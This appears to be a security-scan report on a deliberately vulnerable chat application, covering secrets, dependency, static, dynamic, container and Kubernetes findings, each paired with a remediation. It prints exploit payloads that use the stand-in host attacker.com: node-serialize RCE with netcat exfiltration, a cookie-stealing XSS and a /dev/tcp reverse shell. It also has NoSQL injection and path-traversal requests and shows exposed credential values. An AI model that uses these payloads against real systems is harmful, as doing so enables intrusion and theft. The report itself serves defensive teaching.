## 1. Secrets Scan

Secrets scanning detects credentials, API keys, tokens, and private keys that have been accidentally committed to source code or configuration files.

---

### Case 1 — MongoDB Credentials in a Plaintext Key File

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/key.txt` |
| **Gitleaks Rule** | `mongodb-connection-string` |

**Location:** [`app/chatapp/key.txt:13`](app/chatapp/key.txt)

```
mongodb{user: buihuuloi2004_db_user, password: kS9RGpgyzFnUyAHQ}
```

**Also present in:** `app/chatapp/backend/.env` (line 2) exposes the full connection URI with embedded credentials in an environment file that is committed to git (not in `.gitignore`).

---

### Case 2 — AWS Access Key & Secret Hardcoded in Source

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/backend/src/lib/config.js` |
| **Lines** | 26–27 |
| **Gitleaks Rule** | `aws-access-token` |

**Location:** [`app/chatapp/backend/src/lib/config.js:26-27`](app/chatapp/backend/src/lib/config.js)

```js
export const AWS_CONFIG = {
  accessKeyId: "AKIAIOSFODNN7EXAMPLE",                           // VULN
  secretAccessKey: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", // VULN
};
```

---

### Case 3 — RSA Private Key PEM Block in Source Code

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/backend/src/lib/config.js` |
| **Lines** | 44–53 |
| **Gitleaks Rule** | `private-key` |

**Location:** [`app/chatapp/backend/src/lib/config.js:44-53`](app/chatapp/backend/src/lib/config.js)

```js
export const PRIVATE_KEY = `-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2a2rwplBQL...
-----END RSA PRIVATE KEY-----`;
```

---

### Case 4 — GitHub Personal Access Token in Deploy Script

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/backend/scripts/deploy.sh` |
| **Line** | 26 |
| **Gitleaks Rule** | `github-pat` |

**Location:** [`app/chatapp/backend/scripts/deploy.sh:26`](app/chatapp/backend/scripts/deploy.sh)

```bash
GH_TOKEN="ghp_1234567890abcdefghijklmnopqrstuvwxyz01"  # VULN
```

---

### Case 5 — Docker Registry Password in Plaintext Script

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/backend/scripts/deploy.sh` |
| **Line** | 36 |
| **Gitleaks Rule** | `generic-api-key` / `password-in-url` |

**Location:** [`app/chatapp/backend/scripts/deploy.sh:36`](app/chatapp/backend/scripts/deploy.sh)

```bash
DOCKER_PASSWORD="DockerP@ssw0rd2024!"  # VULN
```

---

### Case 6 — Third-party API Keys Hardcoded

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/backend/src/lib/config.js` |
| **Lines** | 63–67 |
| **Gitleaks Rules** | `stripe-api-token`, `sendgrid-api-token` |

**Location:** [`app/chatapp/backend/src/lib/config.js:63-67`](app/chatapp/backend/src/lib/config.js)

Also: `app/chatapp/backend/.env` line 8 contains a live Resend API key (`re_Jixt9of1_...`), line 22 contains a live Gemini API key (`AIzaSy...`), lines 15–17 contain Cloudinary credentials.

---

## 2. SCA Scan

Software Composition Analysis (SCA) scans third-party libraries for known CVEs in the NVD (National Vulnerability Database). 

---

### Case 1 — Prototype Pollution via lodash@4.17.15

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/backend/package.json` |
| **Package** | `lodash@4.17.15` |
| **Type** | Prototype Pollution / Command Injection |

**Location:** [`app/chatapp/backend/package.json:25`](app/chatapp/backend/package.json)

```json
"lodash": "4.17.15"
```

**CVE-2020-8203 (Prototype Pollution):** The `_.merge()`, `_.mergeWith()`, `_.set()`, and `_.setWith()` functions can be exploited by an attacker to override `Object.prototype` properties. This lets an attacker inject properties into all JavaScript objects, potentially achieving RCE or bypassing access controls.

**Attack example:**
```js
const _ = require('lodash');
_.merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
console.log({}.isAdmin); // true — all objects are now admin!
```

**CVE-2021-23337 (Command Injection):** `lodash.template()` passes JavaScript directly to `Function()` constructor allowing code injection.

**Remediation:** Upgrade to `lodash@4.17.21` or replace with native JS equivalents (spread operator, `structuredClone`).

---

### Case 2 — SSRF via axios@0.21.1

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/backend/package.json` |
| **Package** | `axios@0.21.1` |
| **Type** | Server-Side Request Forgery (SSRF) / Credential Exposure |

**Location:** [`app/chatapp/backend/package.json:26`](app/chatapp/backend/package.json)

```json
"axios": "0.21.1"
```

**CVE-2021-3749 (SSRF):** axios does not limit the number of redirect follows, allowing attackers to craft requests that force the server to make requests to internal network addresses (e.g., `http://169.254.169.254/latest/meta-data/` on AWS).

**CVE-2023-45857:** Authorization headers are inadvertently forwarded across redirects and cross-origin requests, leaking credentials to third-party servers.

**Remediation:** Upgrade to `axios@1.6.0` or later. Validate all URL inputs before making HTTP requests.

---

### Case 3 — Remote Code Execution via node-serialize@0.0.4

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/backend/package.json` |
| **Package** | `node-serialize@0.0.4` |
| **Type** | Insecure Deserialization → Remote Code Execution |

**Location:** [`app/chatapp/backend/package.json:27`](app/chatapp/backend/package.json)

```json
"node-serialize": "0.0.4"
```

**Why it's dangerous:** The `unserialize()` function evaluates Immediately Invoked Function Expressions (IIFEs) embedded in serialized JSON. An attacker who controls the serialized payload achieves arbitrary code execution on the server.

**Exploit payload:**
```json
{
  "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('cat /etc/passwd | nc attacker.com 4444')}()"
}
```

**Used in code at:** [`app/chatapp/backend/src/controllers/auth.controller.js:155`](app/chatapp/backend/src/controllers/auth.controller.js) — `restoreSession` endpoint.

**Remediation:** Remove `node-serialize` entirely. Use `JSON.parse()` which does not execute code.

---

### Case 4 — SSRF via xmlhttprequest@1.8.0

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/backend/package.json` |
| **Package** | `xmlhttprequest@1.8.0` |
| **Type** | Server-Side Request Forgery |

**Location:** [`app/chatapp/backend/package.json:28`](app/chatapp/backend/package.json)

```json
"xmlhttprequest": "1.8.0"
```

**Why it's dangerous:** This version allows requests to `file://` URIs, meaning an attacker can read arbitrary local files (e.g., `/etc/passwd`, `.env`) through the XMLHttpRequest interface.

**Remediation:** Do not use `xmlhttprequest` in a Node.js backend — use native `fetch` or `node:https`. If needed for compatibility, use a patched version `>= 1.8.0` (none exist; the package is abandoned).

---

## 3. SAST Scan

Static Application Security Testing (SAST) analyzes source code at rest — without executing it — to find coding patterns that lead to vulnerabilities. Semgrep uses rule-based pattern matching while SonarQube performs taint analysis.

---

### Case 1 — NoSQL Injection

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/backend/src/controllers/search.controller.js` |
| **Lines** | 36–40 |
| **Semgrep Rule** | `javascript.express.security.audit.express-mongo-injection` |

**Location:** [`app/chatapp/backend/src/controllers/search.controller.js:36-40`](app/chatapp/backend/src/controllers/search.controller.js)

```js
export const searchUsers = async (req, res) => {
  // VULN: req.query.username fed directly into Mongoose query—no sanitization
  const users = await User.find({ fullName: req.query.username }).select("-password");
  res.status(200).json(users);
};
```

**Exploit:** Sending `GET /api/search/users?username[$ne]=invalid` uses MongoDB's `$ne` operator to match ALL users whose name is not "invalid" — bypassing any filter and dumping the entire user database.

**Remediation:**
- Sanitize query params: reject objects/operators, accept only strings
- Use `mongoose-sanitize` or whitelist allowable fields
- Validate with Joi/Zod before querying

---

### Case 2 — Reflected Cross-Site Scripting (XSS)

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/backend/src/controllers/search.controller.js` |
| **Lines** | 56–65 |
| **Semgrep Rule** | `javascript.express.security.audit.xss.raw-html-format` |

**Location:** [`app/chatapp/backend/src/controllers/search.controller.js:56-65`](app/chatapp/backend/src/controllers/search.controller.js)

```js
export const reflectedXss = (req, res) => {
  const query = req.query.q; // raw user input—no sanitization
  res.send(`<html><body><h2>Search Results for: ${query}</h2></body></html>`);
  //                        ^^^^^^^^^^^^—injected directly into HTML
};
```

**Exploit:** `GET /api/search/xss?q=<script>fetch('https://attacker.com?c='+document.cookie)</script>` executes attacker JavaScript in the victim's browser, stealing session cookies.

**Remediation:**
- Never use `res.send()` with unsanitized HTML; use `res.json()` for APIs
- If HTML is needed, escape: `encodeURIComponent()` or a proper HTML escaping library
- Set `Content-Type: application/json` — browsers won't execute scripts in JSON responses
- Implement Content-Security-Policy header

---

### Case 3 — OS Command Injection

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/backend/src/controllers/search.controller.js` |
| **Lines** | 80–88 |
| **Semgrep Rule** | `javascript.lang.security.audit.dangerous-exec-use` |

**Location:** [`app/chatapp/backend/src/controllers/search.controller.js:80-88`](app/chatapp/backend/src/controllers/search.controller.js)

```js
export const pingHost = (req, res) => {
  const host = req.query.host; // unsanitized user input
  exec(`ping -c 3 ${host}`, (error, stdout, stderr) => { ... });
  //             ^^^^^^ injected into shell command string
};
```

**Exploit:** `GET /api/search/ping?host=8.8.8.8;cat /etc/passwd` — the semicolon terminates the `ping` command and the second command runs with web server privileges. More dangerous: `` ?host=x;bash -i >& /dev/tcp/attacker.com/4444 0>&1 `` spawns a reverse shell.

**Remediation:**
- Never use `exec()` with user input
- Use `execFile()` with argument arrays: `execFile('ping', ['-c', '3', host])`
- Validate `host` against a strict regex for IP/hostname format
- Consider using a native ICMP library instead of shelling out

---

### Case 4 — Path Traversal

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/backend/src/controllers/search.controller.js` |
| **Lines** | 103–115 |
| **Semgrep Rule** | `javascript.lang.security.audit.path-traversal` |

**Location:** [`app/chatapp/backend/src/controllers/search.controller.js:103-115`](app/chatapp/backend/src/controllers/search.controller.js)

```js
export const readFile = (req, res) => {
  const filename = req.query.name; // no normalization
  const filePath = path.join(__dirname, "uploads", filename);
  // path.join("uploads", "../../.env") = ".env" — escape from uploads dir!
  const content = fs.readFileSync(filePath, "utf8"); // VULN
};
```

**Exploit:** `GET /api/search/file?name=../../.env` reads the `.env` file containing all secrets. `?name=../../../etc/passwd` reads the system password file.

**Remediation:**
- Normalize the path and verify it stays within the allowed directory:
  ```js
  const resolved = path.resolve(__dirname, 'uploads', filename);
  if (!resolved.startsWith(path.resolve(__dirname, 'uploads'))) {
    return res.status(400).json({ message: 'Invalid path' });
  }
  ```
- Use a whitelist of allowed filenames

---

### Case 5 — Insecure Deserialization (RCE)

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/backend/src/controllers/auth.controller.js` |
| **Lines** | 155–170 |
| **Semgrep Rule** | `javascript.lang.security.audit.unsafe-deserialization` |

**Location:** [`app/chatapp/backend/src/controllers/auth.controller.js:162`](app/chatapp/backend/src/controllers/auth.controller.js)

```js
import serialize from "node-serialize";

export const restoreSession = (req, res) => {
  const { data } = req.body;
  const obj = serialize.unserialize(data); // VULN: executes embedded JS functions
};
```

**Exploit payload (POST body):**
```json
{
  "data": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id | nc attacker.com 4444')}()\"}"
}
```

`unserialize()` detects the `_$$ND_FUNC$$_` prefix and calls `eval()` on the function body, then immediately invokes it — achieving RCE without any authentication required.

**Remediation:**
- Remove `node-serialize` from dependencies
- Use `JSON.parse()` only — it never executes code
- Never deserialize untrusted data from user-controlled input

---

## 4. DAST Scan

Dynamic Application Security Testing (DAST) sends real HTTP requests to a running application and analyzes responses for security indicators. ZAP acts as an intercepting proxy, running active and passive scanning rules against all observed traffic.

---

### Case 1 — Open Redirect

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/backend/src/routes/dast-demo.route.js` |
| **Lines** | 36–39 |
| **ZAP Alert** | "URL Redirection to Untrusted Site ('Open Redirect')" |

**Endpoint:** `GET /api/dast/redirect?url=<any_url>`

**Location:** [`app/chatapp/backend/src/routes/dast-demo.route.js:36-39`](app/chatapp/backend/src/routes/dast-demo.route.js)

```js
router.get("/redirect", (req, res) => {
  const url = req.query.url; // no allowlist validation
  res.redirect(url);          // VULN: arbitrary open redirect
});
```

**Exploit:** An attacker sends victims a legitimately-looking URL: `https://chatapp.com/api/dast/redirect?url=https://evil-phishing.com/login`. The victim sees the trusted domain but is redirected to the attacker's site, enabling credential phishing.

**Remediation:**
- Maintain an explicit allowlist of redirect destinations
- Use relative paths only for redirects (never user-controlled absolute URLs)
- Validate: `if (!allowedDomains.includes(new URL(url).host)) return res.status(400);`

---

### Case 2 — CORS Misconfiguration (Wildcard with Credentials)

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/backend/src/routes/dast-demo.route.js` |
| **Lines** | 54–60 |
| **ZAP Alert** | "Cross-Origin Resource Sharing Misconfiguration" |

**Endpoint:** `GET /api/dast/cors-open`

**Location:** [`app/chatapp/backend/src/routes/dast-demo.route.js:54-60`](app/chatapp/backend/src/routes/dast-demo.route.js)

```js
res.header("Access-Control-Allow-Origin", "*");            // VULN: wildcard
res.header("Access-Control-Allow-Credentials", "true");    // VULN: with credentials
res.json({ secret: "internal-data", userId: "12345", role: "admin" });
```

**Why it's dangerous:** With a wildcard ACAO and credentials allowed, any website can make authenticated requests on behalf of a logged-in user and read the response, bypassing the same-origin policy.

**Remediation:**
- Never combine `Access-Control-Allow-Origin: *` with `credentials: true`
- Use an explicit origin allowlist: `cors({ origin: ['https://chatapp.com'] })`

---

### Case 3 — Missing Security Headers (Clickjacking / MIME sniffing)

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/backend/src/server.js` + `src/routes/dast-demo.route.js` |
| **ZAP Alerts** | "X-Frame-Options Header Not Set", "X-Content-Type-Options Header Missing", "Content-Security-Policy Not Set" |

**Location:** [`app/chatapp/backend/src/server.js:21-24`](app/chatapp/backend/src/server.js) — `helmet()` middleware is deliberately absent.

The server globally sets no security headers. A production server should configure:

| Missing Header | Risk Without It |
|---|---|
| `X-Frame-Options: DENY` | Clickjacking attacks embedding the app in an iframe |
| `X-Content-Type-Options: nosniff` | MIME-type sniffing attacks |
| `Content-Security-Policy` | XSS can load external scripts |
| `Strict-Transport-Security` | Downgrade attacks to HTTP |
| `Referrer-Policy` | URL leakage via Referer header |

**Remediation:**
```js
import helmet from 'helmet';
app.use(helmet()); // sets all security headers with secure defaults
```

---

### Case 4 — Verbose Error Disclosure / Information Leakage

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/backend/src/routes/dast-demo.route.js` |
| **Lines** | 85–97 |
| **ZAP Alert** | "Application Error Disclosure" |

**Endpoint:** `GET /api/dast/verbose-error`

**Location:** [`app/chatapp/backend/src/routes/dast-demo.route.js:85-97`](app/chatapp/backend/src/routes/dast-demo.route.js)

```js
res.status(500).json({
  message: "Something went wrong",
  stack: error.stack,          // VULN: full stack trace with file paths
  environment: process.env,    // VULN: ALL environment variables exposed
  nodeVersion: process.version,
  cwd: process.cwd(),          // VULN: server filesystem path
});
```

**Why it's dangerous:** Stack traces reveal internal file paths, module names, and code structure. `process.env` dumps **all environment variables** including secrets, API keys, and database URIs — this is a complete secrets dump via a single HTTP request.

**Remediation:**
- Log errors server-side only (use Winston, Pino)
- Return generic messages to clients: `{ "message": "Internal server error" }`
- Never expose `process.env` or stack traces in HTTP responses

---

## 5. Container Scan

Container scanning analyzes Docker images for known OS/package CVEs (using databases like NVD, GitHub Advisories), Dockerfile misconfigurations, and secrets embedded in image layers.

---

### Case 1 — Outdated Base Image with Known CVEs (node:16 EOL)

| Attribute | Value |
|---|---|
| **File** | `app/Dockerfile` |
| **Line** | 18 |
| **Trivy Check** | Known OS and package CVEs |

**Location:** [`app/Dockerfile:18`](app/Dockerfile)

```dockerfile
FROM node:16   # VULN: EOL September 2023 — no security patches since then
```

**Why it's dangerous:** Node.js 16 reached End-of-Life on September 11, 2023. Trivy will flag dozens of unpatched CVEs in the base OS packages (OpenSSL, glibc, zlib) and in Node.js itself.

**Sample CVEs in node:16:**
- CVE-2023-30581 (Node.js HTTP smuggling)
- CVE-2023-38552 (Node.js integrity check bypass)
- CVE-2023-39331 (Node.js permission model bypass)

**Remediation:**
```dockerfile
FROM node:22-alpine   # LTS, regularly patched, minimal attack surface
```

---

### Case 2 — Container Runs as Root (No USER Directive)

| Attribute | Value |
|---|---|
| **File** | `app/Dockerfile` |
| **Trivy Check** | `AVD-DS-0002` – "Specify at least 1 USER command in Dockerfile" |

**Location:** [`app/Dockerfile`](app/Dockerfile) — no `USER` directive present.

When no `USER` is specified, the container process runs as **root (UID 0)**. If any code execution vulnerability is exploited (e.g., Cases 3 and 5 in SAST), the attacker has root access within the container and can potentially escape the container.

**Remediation:**
```dockerfile
RUN groupadd -r app && useradd -r -g app app
USER app          # Run as non-root
```

---

### Case 3 — Secrets Baked into Image Layer (.env Copied)

| Attribute | Value |
|---|---|
| **File** | `app/Dockerfile` |
| **Lines** | 48–49 |
| **Trivy Check** | Trivy Secret scanner (`-f sarif --scanners secret`) |

**Location:** [`app/Dockerfile:48-49`](app/Dockerfile)

```dockerfile
COPY chatapp/backend/.env ./chatapp/backend/.env   # VULN: secrets in image layer
COPY chatapp/key.txt ./chatapp/key.txt             # VULN: credentials in image
```

**Why it's dangerous:** Docker layers are permanent. Even if you add `RUN rm .env` in a later layer, the file remains readable in the intermediate layer via `docker image history --no-trunc` or by extracting the layer tarball. Anyone who pulls the image has all the secrets.

**Remediation:**
- Never `COPY` secret files into images
- Use Docker secrets, environment injection, or a secrets manager at runtime
- Add `.env` to `.dockerignore`

---

### Case 4 — OS Package Installation Without Version Pinning

| Attribute | Value |
|---|---|
| **File** | `app/Dockerfile` |
| **Lines** | 27–33 |
| **Trivy Check** | Unpinned package versions |

**Location:** [`app/Dockerfile:27-33`](app/Dockerfile)

```dockerfile
RUN apt-get update && apt-get install -y \
    curl wget netcat-traditional net-tools  # VULN: unversioned, extra attack tools
```

**Why it's dangerous:**
1. Unpinned versions pull whatever is latest at build time — reproducibility is lost and a future build could install a vulnerable version
2. `netcat` and `net-tools` are network reconnaissance tools that serve no purpose in a production image but give an attacker valuable capabilities if they achieve code execution

**Remediation:**
```dockerfile
RUN apt-get update && apt-get install -y --no-install-recommends \
    curl=7.88.1-10+deb12u8 \   # pin exact versions
    && rm -rf /var/lib/apt/lists/*
```

---

### Case 5 — npm install Without --ignore-scripts (Supply Chain)

| Attribute | Value |
|---|---|
| **File** | `app/Dockerfile` |
| **Line** | 38 |
| **Trivy Check** | Supply chain risk |

**Location:** [`app/Dockerfile:38`](app/Dockerfile)

```dockerfile
RUN npm install   # VULN: runs lifecycle scripts (preinstall, postinstall, etc.)
```

**Why it's dangerous:** A malicious or compromised npm package can run arbitrary code during `npm install` via lifecycle scripts (`preinstall`, `postinstall`). This is how supply-chain attacks like `event-stream` (2018) or `ua-parser-js` (2021) execute.

**Remediation:**
```dockerfile
RUN npm ci --ignore-scripts --omit=dev  # no lifecycle scripts, prod deps only
```

---

## 6. IaC Scan

Infrastructure-as-Code (IaC) scanning statically analyzes Kubernetes manifests, Terraform files, and Dockerfiles for security misconfigurations before they are deployed to production.

---

### Case 1 — Container Runs as Root in Kubernetes

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/k8s/deployment.yaml` |
| **Line** | 47–50 |
| **Checkov Check** | `CKV_K8S_6` – "Do not admit root containers" |

**Location:** [`app/chatapp/k8s/deployment.yaml:47-50`](app/chatapp/k8s/deployment.yaml)

```yaml
securityContext:
  runAsUser: 0           # VULN: explicitly root
  runAsNonRoot: false    # VULN: allows root
```

**Remediation:**
```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
```

---

### Case 2 — Privileged Container

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/k8s/deployment.yaml` |
| **Line** | 47 |
| **Checkov Check** | `CKV_K8S_16` – "Do not admit containers with privileged securityContext" |

**Location:** [`app/chatapp/k8s/deployment.yaml:47`](app/chatapp/k8s/deployment.yaml)

```yaml
securityContext:
  privileged: true    # VULN: full host system access — container escape
```

**Why it's dangerous:** A privileged container has nearly the same access as a host process. An attacker who exploits any vulnerability in the application can break out of the container and control the **entire Kubernetes node**.

**Remediation:**
```yaml
securityContext:
  privileged: false
  allowPrivilegeEscalation: false
  capabilities:
    drop: ["ALL"]
```

---

### Case 3 — hostNetwork / hostPID / hostIPC Enabled

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/k8s/deployment.yaml` |
| **Lines** | 31–33 |
| **Checkov Checks** | `CKV_K8S_19`, `CKV_K8S_17`, `CKV_K8S_18` |

**Location:** [`app/chatapp/k8s/deployment.yaml:31-33`](app/chatapp/k8s/deployment.yaml)

```yaml
hostNetwork: true  # VULN: pod shares host network namespace
hostPID: true      # VULN: pod shares host PID namespace
hostIPC: true      # VULN: pod shares host IPC namespace
```

**Why it's dangerous:** `hostNetwork` allows the container to listen on host network interfaces and intercept all traffic. `hostPID` allows seeing and sending signals to all host processes. `hostIPC` allows reading shared memory from other processes.

**Remediation:** Remove all three fields (they default to `false`).

---

### Case 4 — No Resource Limits (Denial of Service Risk)

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/k8s/deployment.yaml` |
| **Checkov Checks** | `CKV_K8S_11` – "CPU limits", `CKV_K8S_13` – "Memory limits" |

**Location:** [`app/chatapp/k8s/deployment.yaml`](app/chatapp/k8s/deployment.yaml) — no `resources` block.

Without limits, a single buggy or compromised pod can consume all CPU/memory on the node, causing other pods to be evicted — a Denial of Service.

**Remediation:**
```yaml
resources:
  requests:
    cpu: "100m"
    memory: "128Mi"
  limits:
    cpu: "500m"
    memory: "512Mi"
```

---

### Case 5 — Secrets in Environment Variables (Not K8s Secrets)

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/k8s/deployment.yaml` |
| **Lines** | 64–70 |
| **Checkov Check** | `CKV_K8S_35` – "Prefer using secrets over environment variables" |

**Location:** [`app/chatapp/k8s/deployment.yaml:64-70`](app/chatapp/k8s/deployment.yaml)

```yaml
env:
  - name: MONGO_URI
    value: "mongodb+srv://admin:password123@cluster0.mongodb.net/chatapp"  # VULN
  - name: JWT_SECRET
    value: "myjwtsecret"  # VULN
```

**Why it's dangerous:** Plaintext env vars in manifests committed to git expose secrets to anyone with repository access. They also appear in `kubectl describe pod` output.

**Remediation:**
```yaml
env:
  - name: MONGO_URI
    valueFrom:
      secretKeyRef:
        name: chatapp-secrets
        key: mongo-uri   # Reference a K8s Secret, never plaintext value
```

---

### Case 6 — NodePort Exposes Database Directly

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/k8s/service.yaml` |
| **Lines** | 33–42 |
| **Checkov Check** | `CKV_K8S_26` – "Do not specify NodePort directly" |

**Location:** [`app/chatapp/k8s/service.yaml:33-42`](app/chatapp/k8s/service.yaml)

```yaml
name: mongodb-service
spec:
  type: NodePort    # VULN: database exposed outside the cluster
  ports:
    - port: 27017
      nodePort: 32017  # VULN: MongoDB reachable from internet on all nodes
```

**Why it's dangerous:** Databases should never be reachable from outside the cluster. This bypasses the application layer entirely, allowing direct MongoDB access with any valid credentials (or via unauthenticated access if auth is misconfigured).

**Remediation:**
```yaml
spec:
  type: ClusterIP   # Internal only — not accessible from outside the cluster
```

---

### Case 7 — Host Filesystem Mounted into Container

| Attribute | Value |
|---|---|
| **File** | `app/chatapp/k8s/deployment.yaml` |
| **Lines** | 79–86 |
| **Checkov Check** | `CKV_K8S_28` – "Do not admit Pods with the hostPath volume" |

**Location:** [`app/chatapp/k8s/deployment.yaml:79-86`](app/chatapp/k8s/deployment.yaml)

```yaml
volumes:
  - name: host-root
    hostPath:
      path: /          # VULN: entire host filesystem read-write
```

**Why it's dangerous:** Mounting the host root filesystem allows reading and modifying any file on the Kubernetes node — including other container filesystems, kubelet configuration, and container runtime sockets. This is a **direct container escape** path.

**Remediation:** Remove hostPath volumes. Use `PersistentVolumeClaim` for storage needs.